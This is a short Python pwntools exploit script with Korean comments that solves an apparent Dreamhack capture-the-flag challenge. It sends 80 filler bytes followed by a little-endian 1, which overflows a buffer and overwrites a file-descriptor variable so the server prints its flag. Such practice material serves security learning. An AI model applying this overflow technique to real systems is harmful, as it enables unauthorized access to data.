from pwn import *

# 서버에 접속 (주어진 호스트와 포트로 변경)
# nc host8.dreamhack.games 19897
host = 'host8.dreamhack.games'
port = 19897

# 원격 서버에 연결
p = remote(host, port)

# 페이로드 생성
# 1. buf(80바이트)를 더미 데이터('A')로 채움
payload = b'A' * 80 
# 2. 이어서 나오는 tmp_fd 변수를 1(표준 출력)로 덮어씀 (32비트 리틀 엔디안)
payload += p32(1)

# "Your Input: " 문자열이 출력될 때까지 기다렸다가 페이로드 전송
p.sendafter(b"Your Input: ", payload)

# 결과 수신 및 화면 출력 (플래그가 출력됨)
print(p.recvall().decode('utf-8', errors='ignore'))